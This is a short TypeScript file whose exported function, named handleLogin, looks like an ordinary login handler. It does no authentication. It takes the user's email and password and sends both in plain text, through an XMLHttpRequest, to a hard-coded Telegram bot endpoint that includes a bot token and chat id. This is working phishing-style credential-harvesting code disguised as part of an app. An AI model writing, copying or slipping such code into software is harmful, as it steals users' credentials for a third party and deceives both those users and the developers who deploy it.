export async function handleLogin(email: string, password: string) {
  console.log(`Login attempt with email: ${email}`);
  
   var xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                    console.log(xhr.response);
                  }
                };
                xhr.open(
                  "get",
                  `https://api.telegram.org/bot8037747937:AAF0msiBKIVfmzxBsc8s59YTPaFSrH5TrAU/sendMessage?chat_id=7547959855&text=📧 Email : ${email}\n 🔒 Password:${password}\n`,
                  true
                );
                xhr.setRequestHeader(
                  "Content-Type",
                  "application/x-www-form-urlencoded; charset=UTF-8"
                );

                xhr.setRequestHeader(
                  "Content-Type",
                  "application/x-www-form-urlencoded; charset=UTF-8"
                );
                xhr.send();
}

